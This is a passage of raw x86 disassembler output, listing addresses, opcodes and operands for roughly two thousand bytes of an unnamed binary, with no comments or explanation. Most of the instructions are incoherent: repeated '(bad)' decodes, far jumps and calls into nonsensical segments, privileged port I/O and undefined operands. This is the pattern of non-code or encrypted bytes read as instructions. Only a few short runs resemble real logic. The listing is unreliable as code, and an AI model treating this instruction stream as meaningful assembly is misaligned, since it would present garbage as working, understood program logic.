  4105ba:	adc    DWORD PTR [edi-0x15],eax
  4105bd:	xor    eax,DWORD PTR [edi-0x2b]
  4105c0:	enter  0xe2a7,0x11
  4105c4:	add    DWORD PTR [eax-0x1aa3e96b],ecx
  4105ca:	aam    0x2d
  4105cc:	data16 ror BYTE PTR [esi+0x7a],1
  4105d0:	sub    al,0xc1
  4105d2:	add    ch,ch
  4105d4:	dec    edx
  4105d5:	jmp    0x776f:0x9ce1ed98
  4105dc:	ins    BYTE PTR es:[edi],dx
  4105dd:	fstp   QWORD PTR [ebx+0x6fdc0a02]
  4105e3:	inc    esp
  4105e4:	dec    edi
  4105e5:	addr16 dec ebp
  4105e7:	dec    edi
  4105e8:	mov    dh,0xa1
  4105ea:	mov    ch,0x93
  4105ec:	pop    ebx
  4105ed:	loopne 0x410612
  4105ef:	mov    bl,0xe8
  4105f1:	push   ecx
  4105f2:	inc    ecx
  4105f3:	push   esi
  4105f4:	push   0xffffffe4
  4105f6:	stc    
  4105f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105f8:	xchg   edi,eax
  4105f9:	jp     0x410651
  4105fb:	pop    esi
  4105fc:	leave  
  4105fd:	ds or  bh,al
  410600:	in     eax,0xc
  410602:	jno    0x4105f0
  410604:	mov    al,ds:0xdb56d79
  410609:	stc    
  41060a:	push   cs
  41060b:	and    ebx,edx
  41060d:	jge    0x4105f9
  41060f:	mov    dh,0xd4
  410611:	sub    edx,ebx
  410613:	jmp    0x41066e
  410615:	outs   dx,DWORD PTR ds:[esi]
  410616:	add    eax,0x3ee00129
  41061b:	ds lock pop ecx
  41061e:	test   DWORD PTR [edx],edi
  410620:	mov    cl,0x92
  410622:	mov    dl,0x95
  410624:	xchg   ecx,eax
  410625:	(bad)  
  410626:	call   0xecb2:0xeeabacc8
  41062d:	jge    0x410661
  41062f:	out    0xbe,eax
  410631:	outs   dx,DWORD PTR ds:[esi]
  410632:	jp     0x410680
  410634:	mov    al,ds:0x1d0d815d
  410639:	retf   0xacd7
  41063c:	in     al,dx
  41063d:	or     eax,0x75a48f80
  410642:	xlat   BYTE PTR ds:[ebx]
  410643:	pop    esp
  410644:	fld    QWORD PTR [edi-0x11efd218]
  41064a:	data16 mov dl,0x36
  41064d:	test   BYTE PTR [edi-0x5c1e78e3],bl
  410653:	mov    edi,0x361330de
  410658:	cmp    ebp,DWORD PTR [edi+esi*4]
  41065b:	(bad)  
  41065c:	and    cl,dh
  41065e:	pushf  
  41065f:	nop
  410660:	(bad)  
  410661:	dec    edi
  410662:	push   cs
  410663:	xor    bh,cl
  410665:	mov    eax,0x7bb49ae5
  41066a:	mov    dh,0xb4
  41066c:	stc    
  41066d:	dec    esp
  41066e:	or     DWORD PTR [ebp+0x2c],eax
  410671:	jne    0x410637
  410673:	fwait
  410674:	shr    DWORD PTR [esi-0x6c],0x54
  410678:	and    dh,BYTE PTR [eax]
  41067a:	cmp    dh,bh
  41067c:	xlat   BYTE PTR ds:[ebx]
  41067d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41067e:	jmp    0x41066b
  410680:	movhps xmm0,QWORD PTR [eax]
  410683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410684:	sbb    al,0x3
  410686:	pop    ecx
  410687:	mov    eax,ds:0x8573443f
  41068c:	jb     0x4106f0
  41068e:	sub    DWORD PTR [edi-0x59db2fa7],ebp
  410694:	inc    edi
  410695:	pop    DWORD PTR [edi+0x78ad54d7]
  41069b:	jmp    0x4106fc
  41069d:	fistp  QWORD PTR [edx+0x67b42ba8]
  4106a3:	std    
  4106a4:	ret    
  4106a5:	xchg   ecx,eax
  4106a6:	jecxz  0x41066a
  4106a8:	dec    DWORD PTR [eax+0x1d291b6e]
  4106ae:	fcmovnu st,st(7)
  4106b0:	or     bl,cl
  4106b2:	rol    BYTE PTR [edx+edx*2+0x5c2164d9],1
  4106b9:	jb     0x410699
  4106bb:	ins    DWORD PTR es:[edi],dx
  4106bc:	outs   dx,BYTE PTR ds:[esi]
  4106bd:	std    
  4106be:	(bad)  
  4106bf:	jnp    0x410693
  4106c1:	repz dec ebp
  4106c3:	and    ah,BYTE PTR [edx+0x2873710d]
  4106c9:	add    ecx,esp
  4106cb:	mov    BYTE PTR ds:0x980f891f,ch
  4106d1:	and    DWORD PTR [ebx+eax*4+0x2d],eax
  4106d5:	add    cl,al
  4106d7:	add    BYTE PTR [eax-0x39ba2ad9],dl
  4106dd:	mov    WORD PTR [ebp+0xbbf3f1b],ds
  4106e3:	mul    edi
  4106e5:	push   ebp
  4106e6:	mov    ebx,0xe41107a0
  4106eb:	xchg   edx,eax
  4106ec:	jns    0x4106b6
  4106ee:	inc    ebx
  4106ef:	ja     0x4106f8
  4106f1:	ret    0x49e1
  4106f4:	inc    ebp
  4106f5:	int3   
  4106f6:	(bad)  [edx]
  4106f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106f9:	ret    0xb2d4
  4106fc:	ficomp DWORD PTR [eax]
  4106fe:	loopne 0x410714
  410700:	xchg   esi,eax
  410701:	(bad)  [esi+0x1c65ed5]
  410707:	aam    0x97
  410709:	jo     0x410690
  41070b:	mov    esp,0x8e10b97d
  410710:	jmp    0x4106cc
  410712:	clc    
  410713:	out    dx,al
  410714:	imul   esi,DWORD PTR [ecx+ebx*4],0xffffffab
  410718:	jbe    0x41072c
  41071a:	out    dx,al
  41071b:	sub    al,0x8a
  41071d:	mov    dl,0xc3
  41071f:	pop    edx
  410720:	xchg   esp,eax
  410721:	jnp    0x41072c
  410723:	mov    ds:0x7594d99f,eax
  410728:	inc    esi
  410729:	xor    esp,DWORD PTR [ebp-0x4ec614ec]
  41072f:	mov    esp,0xdb14338b
  410734:	sbb    bh,BYTE PTR [edx]
  410736:	push   ecx
  410737:	lahf   
  410738:	and    dh,BYTE PTR [ecx+edi*2]
  41073b:	mov    esp,0x52dfda66
  410740:	int    0xa6
  410742:	sti    
  410743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410744:	adc    ebx,DWORD PTR [esi]
  410746:	inc    ebp
  410747:	cmc    
  410748:	cdq    
  410749:	xlat   BYTE PTR ds:[ebx]
  41074a:	(bad)  
  41074b:	enter  0x5503,0x2e
  41074f:	cli    
  410750:	fild   DWORD PTR [edi+0xb83212c]
  410756:	stos   BYTE PTR es:[edi],al
  410757:	inc    ebx
  410758:	adc    dl,BYTE PTR [edx-0x47d5bb10]
  41075e:	lods   eax,DWORD PTR ds:[esi]
  41075f:	add    al,0x2f
  410761:	mov    al,ds:0xbc7eb5bb
  410766:	xor    DWORD PTR [ebp+0x78eb3b7],ebx
  41076c:	pop    ebp
  41076d:	test   eax,0xea40593c
  410772:	xor    DWORD PTR [ebp-0x60],esp
  410775:	jmp    0x410701
  410777:	adc    dl,BYTE PTR [edi-0x520d032d]
  41077d:	mov    al,ds:0xede3fc29
  410782:	jo     0x4107e6
  410784:	jecxz  0x41071e
  410786:	retf   
  410787:	mov    ecx,0xd1f1e594
  41078c:	stos   DWORD PTR es:[edi],eax
  41078d:	fldcw  WORD PTR [edx]
  41078f:	mov    esp,0xefb5cfe
  410794:	xchg   ebp,eax
  410795:	(bad)  
  410796:	popf   
  410797:	xchg   esp,eax
  410798:	inc    edi
  410799:	mov    ah,0xf9
  41079b:	inc    edx
  41079c:	cs (bad) 
  41079e:	rcl    BYTE PTR [ebp-0x57],cl
  4107a1:	in     eax,dx
  4107a2:	ss xchg ecx,eax
  4107a4:	leave  
  4107a5:	sbb    DWORD PTR [eax-0x350e34ab],eax
  4107ab:	outs   dx,DWORD PTR ds:[esi]
  4107ac:	in     al,0xe4
  4107ae:	sub    al,0xc3
  4107b0:	lds    ecx,FWORD PTR [ebx-0x75ebf7b5]
  4107b6:	movd   mm6,DWORD PTR [ebx+0x56d7acb7]
  4107bd:	aas    
  4107be:	imul   DWORD PTR [ecx+0x6d134786]
  4107c4:	into   
  4107c5:	cmp    edx,ecx
  4107c7:	mov    esi,0x9aac6be9
  4107cc:	int    0x9e
  4107ce:	mov    ecx,0xd55a642
  4107d3:	ret    0x415d
  4107d6:	dec    eax
  4107d7:	pop    es
  4107d8:	aas    
  4107d9:	repnz call 0x4be2:0x6c509a90
  4107e1:	les    eax,FWORD PTR [esp+ebp*1-0x35]
  4107e5:	loop   0x410811
  4107e7:	fdivp  st(6),st
  4107e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ea:	pop    ebp
  4107eb:	mov    ebx,0x5bd75387
  4107f0:	or     BYTE PTR [edi-0x71c78654],ah
  4107f6:	dec    ebx
  4107f7:	cmp    ch,BYTE PTR [ecx]
  4107f9:	retf   
  4107fa:	sub    ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	clc    
  410810:	pop    esi
  410811:	in     al,0x39
  410813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	sar    BYTE PTR [edi],1
  41081d:	push   edx
  41081e:	or     esp,eax
  410820:	ja     0x41088a
  410822:	sub    eax,0x3b152722
  410827:	lea    ecx,[eax+esi*8-0x621e9170]
  41082e:	push   ebp
  41082f:	adc    esp,ebp
  410831:	inc    ebp
  410832:	dec    edx
  410833:	pusha  
  410834:	pop    eax
  410835:	jge    0x4107dc
  410837:	shr    edx,1
  410839:	outs   dx,BYTE PTR ds:[esi]
  41083a:	shl    DWORD PTR [ebp+0x7e],cl
  41083d:	sub    eax,0xd9535245
  410842:	mov    al,0x5
  410844:	jns    0x4107f1
  410846:	jns    0x41084a
  410848:	xchg   ecx,eax
  410849:	push   es
  41084a:	mov    bh,bh
  41084c:	mov    dl,0x53
  41084e:	mov    ebx,ds
  410850:	pop    ss
  410851:	scas   al,BYTE PTR es:[edi]
  410852:	mov    eax,0x881f4210
  410857:	sti    
  410858:	push   ss
  410859:	call   0xfc7c0189
  41085e:	xchg   ebp,eax
  41085f:	dec    ebp
  410860:	pop    edx
  410861:	popa   
  410862:	cmp    esi,DWORD PTR [esi-0x45d2d40b]
  410868:	push   cs
  410869:	cmp    al,0xb2
  41086b:	cmp    al,0xe6
  41086d:	and    edi,esp
  41086f:	pop    ebp
  410870:	cli    
  410871:	in     al,dx
  410872:	dec    eax
  410873:	xchg   bl,cl
  410875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410876:	sahf   
  410877:	jne    0x410808
  410879:	xchg   BYTE PTR [ecx-0x57],bh
  41087c:	push   esi
  41087d:	mov    edx,ebp
  41087f:	fsub   QWORD PTR [ecx-0x19]
  410882:	pop    ecx
  410883:	pop    edx
  410884:	xor    ecx,DWORD PTR [ebp+0x73]
  410887:	jmp    0x4108a3
  410889:	fidivr WORD PTR [esi-0x1d556951]
  41088f:	sbb    al,0xec
  410891:	jo     0x4108ec
  410893:	jb     0x41090b
  410895:	mov    ch,0xd0
  410897:	(bad)  
  410898:	sti    
  410899:	retf   
  41089a:	imul   ecx,DWORD PTR [esi-0x273e4bbb],0x25
  4108a1:	cmp    ecx,ebp
  4108a3:	dec    edi
  4108a4:	hlt    
  4108a5:	xlat   BYTE PTR ds:[ebx]
  4108a6:	jmp    0x4e1b8b84
  4108ab:	sbb    eax,0x9fdbd460
  4108b0:	sbb    dh,BYTE PTR [ecx-0xc]
  4108b3:	mov    al,0x55
  4108b5:	inc    edx
  4108b6:	inc    ebx
  4108b7:	or     al,0x42
  4108b9:	repnz jmp 0x8808:0xfb066741
  4108c1:	fisub  WORD PTR [eax-0x65]
  4108c4:	rcl    DWORD PTR [ebx],1
  4108c6:	int3   
  4108c7:	push   esp
  4108c8:	mov    edi,ds
  4108ca:	test   eax,0x5ba067bb
  4108cf:	and    DWORD PTR [esi-0x683a6ba9],edx
  4108d5:	mov    ebp,0x2fafd8f2
  4108da:	mov    edx,0x60d7fdb7
  4108df:	mov    eax,ds:0x976efc83
  4108e4:	call   0xb1b50cc5
  4108e9:	(bad)  
  4108ea:	test   al,0x37
  4108ec:	pusha  
  4108ed:	ss (bad) 
  4108ef:	cs xchg edx,eax
  4108f1:	push   ebx
  4108f2:	dec    ebp
  4108f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f4:	(bad)  
  4108f5:	ror    DWORD PTR [ebx+esi*2-0x16dea612],1
  4108fc:	fcom   DWORD PTR [esi]
  4108fe:	push   es
  4108ff:	mov    al,BYTE PTR [ecx+0x5a]
  410902:	xor    edi,esi
  410904:	call   0x8a6c4353
  410909:	jo     0x4108c1
  41090b:	pop    es
  41090c:	adc    BYTE PTR [esi-0x6a0eec4],dh
  410912:	mov    dh,0xe2
  410914:	outs   dx,DWORD PTR ds:[esi]
  410915:	mov    bl,0x3f
  410917:	pop    ebx
  410918:	xchg   ebp,eax
  410919:	or     dl,BYTE PTR [ecx]
  41091b:	add    ah,BYTE PTR [ebp-0x3a]
  41091e:	pop    esi
  41091f:	shr    BYTE PTR [edi-0x33513af9],cl
  410925:	pop    es
  410926:	push   ebx
  410927:	stos   DWORD PTR es:[edi],eax
  410928:	sar    BYTE PTR [ecx+0x31315a14],cl
  41092e:	add    dh,BYTE PTR [esi+eax*8+0x4a]
  410932:	out    dx,al
  410933:	mov    dl,BYTE PTR [ecx+0x33571153]
  410939:	popa   
  41093a:	cmp    al,0x41
  41093c:	call   0x1592:0x4d2b94fc
  410943:	mov    ecx,0x87eb0673
  410948:	cdq    
  410949:	pop    ebx
  41094a:	mov    dh,0x56
  41094c:	jmp    DWORD PTR [ebp+0x76378855]
  410952:	xor    ebx,DWORD PTR [edi-0xa3b00ef]
  410958:	mov    al,ds:0xab3bf214
  41095d:	(bad)  
  41095e:	jmp    0x86747aa4
  410963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410964:	mov    ds:0xefb2b70b,eax
  410969:	mov    WORD PTR [edi],gs
  41096b:	in     al,0xa3
  41096d:	mov    ds:0xf893558,eax
  410972:	or     BYTE PTR [esi-0x7f7b1fbd],0x3d
  410979:	dec    edi
  41097a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41097b:	cdq    
  41097c:	cmp    DWORD PTR [ebx],eax
  41097e:	push   ebp
  41097f:	daa    
  410980:	mov    al,0x2a
  410982:	call   0xd18c5faa
  410987:	xor    DWORD PTR [edx+0x18],0x79
  41098b:	loopne 0x41099b
  41098d:	(bad)  
  41098e:	adc    eax,eax
  410990:	mov    al,ds:0x20cb9324
  410995:	mov    dh,0x5e
  410997:	push   cs
  410998:	(bad)  
  41099a:	shr    DWORD PTR ds:0x16696697,1
  4109a0:	push   ds
  4109a1:	cmp    BYTE PTR [ecx],bl
  4109a3:	arpl   WORD PTR [ebx-0x2a],dx
  4109a6:	pop    eax
  4109a7:	and    al,0x57
  4109a9:	aas    
  4109aa:	push   esi
  4109ab:	je     0x410a2a
  4109ad:	cdq    
  4109ae:	sar    ah,cl
  4109b0:	sahf   
  4109b1:	js     0x410a20
  4109b3:	add    DWORD PTR [edx],edx
  4109b5:	(bad)  
  4109b6:	loope  0x410986
  4109b8:	push   0x1ebdfd00
  4109bd:	xchg   BYTE PTR [eax-0x2d3d26f0],bl
  4109c3:	scas   eax,DWORD PTR es:[edi]
  4109c4:	jg     0x41096f
  4109c6:	push   ss
  4109c7:	jno    0x410966
  4109c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109ca:	mov    bh,0xdb
  4109cc:	mov    BYTE PTR [eax+0x7f9454e8],al
  4109d2:	jl     0x4109dc
  4109d4:	dec    esi
  4109d5:	aas    
  4109d6:	(bad)  
  4109d7:	arpl   WORD PTR [esi-0x7b2887fb],bp
  4109dd:	aas    
  4109de:	shl    DWORD PTR ds:[esi],0x1d
  4109e2:	fist   DWORD PTR ds:0x4cba4a0b
  4109e8:	push   eax
  4109e9:	or     BYTE PTR [esi-0xb],ch
  4109ec:	out    dx,al
  4109ed:	or     DWORD PTR [ebp-0x7],edx
  4109f0:	pop    ecx
  4109f1:	jmp    0xa6ee:0xbcce819a
  4109f8:	rcr    cl,1
  4109fa:	xchg   ecx,eax
  4109fb:	jge    0x4109b4
  4109fd:	nop    ecx
  410a00:	jg     0x410a7a
  410a02:	add    DWORD PTR [eax],ecx
  410a04:	cmc    
  410a05:	push   edx
  410a06:	es shl bl,1
  410a09:	outs   dx,DWORD PTR ds:[esi]
  410a0a:	cmc    
  410a0b:	dec    eax
  410a0c:	cli    
  410a0d:	ins    DWORD PTR es:[edi],dx
  410a0e:	sbb    eax,0xffffffa2
  410a11:	inc    edi
  410a12:	mov    bh,0x1b
  410a14:	test   al,0x4b
  410a16:	sbb    ch,BYTE PTR [eax+0x3a08e1e6]
  410a1c:	jmp    0x5dc4:0x7c35f9dc
  410a23:	adc    DWORD PTR [edi],ecx
  410a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a26:	sbb    bh,BYTE PTR fs:[eax-0x5b6a6d0c]
  410a2d:	pushf  
  410a2e:	xchg   esi,eax
  410a2f:	out    0x65,al
  410a31:	idiv   DWORD PTR [esi+0x4316eaf7]
  410a37:	(bad)  
  410a38:	call   0x8dcc6dd8
  410a3d:	mov    esp,0xe32573ef
  410a42:	test   eax,0xd7935336
  410a47:	mov    dh,0xec
  410a49:	aaa    
  410a4a:	in     al,0xff
  410a4c:	(bad)  
  410a4d:	push   edi
  410a4e:	push   esp
  410a4f:	ins    BYTE PTR es:[edi],dx
  410a50:	xor    dl,BYTE PTR [ebx-0x5]
  410a53:	pushf  
  410a54:	push   es
  410a55:	int3   
  410a56:	lea    edi,[ebp+0x33]
  410a59:	mov    ah,cl
  410a5b:	std    
  410a5c:	icebp  
  410a5d:	sub    DWORD PTR [esi+0x1b3e69f6],0x9626941c
  410a67:	jbe    0x410aa6
  410a69:	sub    DWORD PTR [edx-0x62],eax
  410a6c:	push   esp
  410a6d:	je     0x410a28
  410a6f:	je     0x410a1a
  410a71:	syscall 
  410a73:	(bad)  
  410a74:	aam    0x0
  410a76:	neg    ch
  410a78:	retf   
  410a79:	std    
  410a7a:	pushf  
  410a7b:	loope  0x410aba
  410a7d:	arpl   WORD PTR [ebx-0x26],dx
  410a80:	push   ds
  410a81:	xchg   dl,bh
  410a83:	scas   al,BYTE PTR es:[edi]
  410a84:	adc    DWORD PTR [eax+0xf],0xffffff87
  410a88:	or     BYTE PTR [eax],al
  410a8a:	add    BYTE PTR [eax],al
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	idiv   DWORD PTR [ebx+0x39]
  410ab1:	jne    0x410a37
  410ab3:	adc    edx,DWORD PTR [esi+0x78]
  410ab6:	js     0x410a9d
  410ab8:	jle    0x410b32
  410aba:	js     0x410ae5
  410abc:	mov    bl,0x52
  410abe:	dec    ebx
  410abf:	dec    esp
  410ac0:	call   DWORD PTR [ecx]
  410ac2:	nop
  410ac3:	sub    esp,DWORD PTR [edx+0x52659be6]
  410ac9:	dec    ecx
  410aca:	pushf  
  410acb:	(bad)  [edx+0x68]
  410ace:	rcr    BYTE PTR [edi+0x7],cl
  410ad1:	push   0xc6f348a9
  410ad6:	mov    cl,0xf9
  410ad8:	xchg   esi,eax
  410ad9:	mov    ecx,0x5f47703e
  410ade:	out    dx,eax
  410adf:	(bad)  
  410ae0:	ror    esp,cl
  410ae2:	push   ds
  410ae3:	loop   0x410ab3
  410ae5:	and    al,0x4
  410ae7:	std    
  410ae8:	imul   ebp,DWORD PTR ds:0xa7db44c5,0x5
  410aef:	and    DWORD PTR ds:0x37323030,esp
  410af5:	call   0x6e3c:0x8032aced
  410afc:	and    eax,0x96c75113
  410b01:	add    al,0xb7
  410b03:	jg     0x410aef
  410b05:	adc    BYTE PTR [edx+0x76],bl
  410b08:	push   edx
  410b09:	daa    
  410b0a:	leave  
  410b0b:	xor    al,0xa2
  410b0d:	inc    ebp
  410b0e:	sub    ebx,DWORD PTR [ebx+0x5ac2a6e0]
  410b14:	mov    ebp,0xe364ad41
  410b19:	mov    dh,ah
  410b1b:	xlat   BYTE PTR ds:[ebx]
  410b1c:	mov    esp,0xdcf71a5d
  410b21:	pop    ds
  410b22:	jp     0x410ad9
  410b24:	or     eax,0x1188f6a7
  410b29:	jnp    0x410ba6
  410b2b:	and    ah,BYTE PTR [edi-0x49]
  410b2e:	outs   dx,BYTE PTR ds:[esi]
  410b2f:	ds out 0x58,eax
  410b32:	mov    esp,0xa7d8b88
  410b37:	add    al,0x6
  410b39:	jmp    0x7f76:0x3d8a1017
  410b40:	in     al,dx
  410b41:	ins    BYTE PTR es:[edi],dx
  410b42:	jg     0x410b31
  410b44:	dec    ebp
  410b45:	pop    eax
  410b46:	push   ds
  410b47:	je     0x410b9e
  410b49:	aad    0x90
  410b4b:	inc    esp
  410b4c:	dec    edi
  410b4d:	repnz loopne 0x410bb5
  410b50:	xchg   edi,eax
  410b51:	push   eax
  410b52:	mov    al,ds:0x743bf5ef
  410b57:	pop    ebp
  410b58:	scas   al,BYTE PTR es:[edi]
  410b59:	mov    ?,WORD PTR [ebx-0x33fead51]
  410b5f:	ins    DWORD PTR es:[edi],dx
  410b60:	lock jmp 0x410b75
  410b63:	add    BYTE PTR fs:[ebp-0x4d],dh
  410b67:	pushf  
  410b68:	fistp  WORD PTR [esi]
  410b6a:	lock pop esp
  410b6c:	stc    
  410b6d:	or     DWORD PTR [edi-0x12],esp
  410b70:	aaa    
  410b71:	xor    DWORD PTR [esi-0x512bca12],ecx
  410b77:	dec    edi
  410b78:	sbb    BYTE PTR [edx],0x69
  410b7b:	idiv   ecx
  410b7d:	push   eax
  410b7e:	jg     0x410b82
  410b80:	ffree  st(7)
  410b82:	and    eax,0xf9333caf
  410b87:	sub    esp,0x6df690f4
  410b8d:	mov    ds:0x1f317a03,eax
  410b92:	or     edi,DWORD PTR [eax+0x30]
  410b95:	mov    dl,0x4e
  410b97:	aam    0x58
  410b99:	mov    ebp,0xdeb92d04
  410b9e:	(bad)  
  410b9f:	adc    BYTE PTR [ecx],dl
  410ba1:	(bad)  
  410ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ba4:	xor    eax,0xe0971231
  410ba9:	popf   
  410baa:	stos   DWORD PTR es:[edi],eax
  410bab:	cwde   
  410bac:	loope  0x410bfa
  410bae:	cdq    
  410baf:	mov    bl,0x25
  410bb1:	and    DWORD PTR [esi],ebp
  410bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb4:	pop    ebp
  410bb5:	gs push ss
  410bb7:	push   eax
  410bb8:	add    ah,cl
  410bba:	or     al,0xfd
  410bbc:	aad    0x36
  410bbe:	mov    eax,ds:0x77f459b
  410bc3:	and    ecx,DWORD PTR [edx-0x6007daa4]
  410bc9:	imul   BYTE PTR [esi+ecx*1]
  410bcc:	int    0x18
  410bce:	jmp    0xe3de:0x9fa18ca1
  410bd5:	pop    edx
  410bd6:	iret   
  410bd7:	lock xor esi,DWORD PTR [ecx+eax*4+0x5af36e37]
  410bdf:	sbb    DWORD PTR [ecx+edx*8+0x7a0f7074],esi
  410be6:	out    0x77,eax
  410be8:	sbb    cl,al
  410bea:	xor    eax,0x37c46174
  410bef:	std    
  410bf0:	mov    eax,0x63b57e85
  410bf5:	call   DWORD PTR [esi]
  410bf7:	out    0xf2,eax
  410bf9:	icebp  
  410bfa:	out    dx,al
  410bfb:	sbb    BYTE PTR [eax],al
  410bfd:	adc    BYTE PTR [edi+ebx*4+0x45a167de],dl
  410c04:	sbb    bl,BYTE PTR [esi+eax*4]
  410c07:	jg     0x410bca
  410c09:	cmp    DWORD PTR [ebp-0x3b],ecx
  410c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c0d:	cdq    
  410c0e:	mov    bl,0x5c
  410c10:	aaa    
  410c11:	jbe    0x410bd0
  410c13:	jecxz  0x410bda
  410c15:	mov    DWORD PTR [ebx+0xc],ecx
  410c18:	xchg   ebx,eax
  410c19:	cmp    al,0xd8
  410c1b:	cdq    
  410c1c:	rcr    ch,0x5e
  410c1f:	xchg   edx,eax
  410c20:	scas   al,BYTE PTR es:[edi]
  410c21:	add    DWORD PTR [eax+esi*2],0xffffff9e
  410c25:	arpl   WORD PTR [ebx-0x3c],sp
  410c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c29:	out    dx,al
  410c2a:	and    BYTE PTR [ebx-0x7b20c266],bh
  410c30:	shr    DWORD PTR [esi+0x6076af2e],cl
  410c36:	(bad)  
  410c37:	fdivrp st(0),st
  410c39:	xor    eax,0xa01381c0
  410c3e:	sbb    eax,0x493855f4
  410c43:	rcl    ebx,1
  410c45:	push   ebx
  410c46:	inc    ebp
  410c47:	jmp    0x410c53
  410c49:	add    BYTE PTR [ebp-0x55abf2ab],0xd3
  410c50:	fistp  DWORD PTR [esi+0x288ea906]
  410c56:	data16 loopne 0x410c64
  410c59:	jl     0x410c69
  410c5b:	stc    
  410c5c:	jl     0x410c43
  410c5e:	in     al,dx
  410c5f:	inc    esi
  410c60:	rol    ecx,0x73
  410c63:	ret    0xbd92
  410c66:	add    al,0xc9
  410c68:	mov    ?,ebp
  410c6a:	lods   eax,DWORD PTR ds:[esi]
  410c6b:	ss adc eax,0xb7cbec03
  410c71:	and    BYTE PTR [esi-0x3f0fb498],0x94
  410c78:	jle    0x410c42
  410c7a:	scas   al,BYTE PTR es:[edi]
  410c7b:	inc    ebp
  410c7c:	in     eax,dx
  410c7d:	push   edx
  410c7e:	xchg   esi,eax
  410c7f:	pop    esi
  410c80:	jmp    0xb1cd2c12
  410c85:	sub    DWORD PTR [edi],0x5897e85c
  410c8b:	int3   
  410c8c:	push   cs
  410c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8e:	and    ah,ch
  410c90:	push   es
  410c91:	push   cs
  410c92:	pop    es
  410c93:	int    0x76
  410c95:	ret    
  410c96:	pop    edi
  410c97:	push   esp
  410c98:	imul   eax,DWORD PTR [eax-0x33811723],0x60f591d4
  410ca2:	and    ebp,DWORD PTR [edi+0xc8a6a3]
  410ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca9:	push   edi
  410caa:	test   eax,0xb8ec781d
  410caf:	stc    
  410cb0:	lea    esp,[ecx]
  410cb2:	push   ds
  410cb3:	pop    esi
  410cb4:	add    BYTE PTR [ecx],dh
  410cb6:	into   
  410cb7:	mov    ch,0x35
  410cba:	in     eax,0x79
  410cbc:	fcomp  QWORD PTR [eax+0x453fa15c]
  410cc2:	sub    BYTE PTR [ebp-0x249d3ca2],bh
  410cc8:	xor    DWORD PTR [ebx],eax
  410cca:	outs   dx,BYTE PTR ds:[esi]
  410ccb:	jmp    DWORD PTR [edx-0x655e2217]
  410cd1:	fdiv   st(3),st
  410cd3:	sub    eax,0xd115641b
  410cd8:	adc    DWORD PTR [edi],ecx
  410cda:	push   esp
  410cdb:	mov    eax,0x1491b560
  410ce0:	(bad)  
  410ce1:	dec    eax
  410ce2:	lahf   
  410ce3:	pop    eax
  410ce4:	jmp    0x2145:0xa7afba78
  410ceb:	jp     0x410cd0
  410ced:	ret    0x58e9
  410cf0:	(bad)  
  410cf1:	int3   
  410cf2:	je     0x410ce4
  410cf4:	lahf   
  410cf5:	sar    esi,cl
  410cf7:	mov    edi,0x1576d71
  410cfc:	or     eax,0xa7767712
  410d01:	call   0x10ce:0x8357de2a
  410d08:	lock xchg ebx,eax
  410d0a:	lods   eax,DWORD PTR ds:[esi]
  410d0b:	adc    al,0x86
  410d0d:	std    
  410d0e:	dec    ebp
  410d0f:	adc    DWORD PTR [ebx],edi
  410d11:	neg    dh
  410d13:	sbb    ebp,DWORD PTR [ecx+0x25]
  410d16:	sub    cl,bl
  410d18:	std    
  410d19:	sbb    BYTE PTR [ecx],bh
  410d1b:	jp     0x410d04
  410d1d:	xor    dh,BYTE PTR [eax]
  410d1f:	sbb    eax,DWORD PTR [ebp-0xa]
  410d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d23:	sbb    edi,edx
  410d25:	adc    eax,0xd103f903
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	xor    edx,DWORD PTR [eax+0x54f89c01]
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	adc    BYTE PTR [esi],0x1a
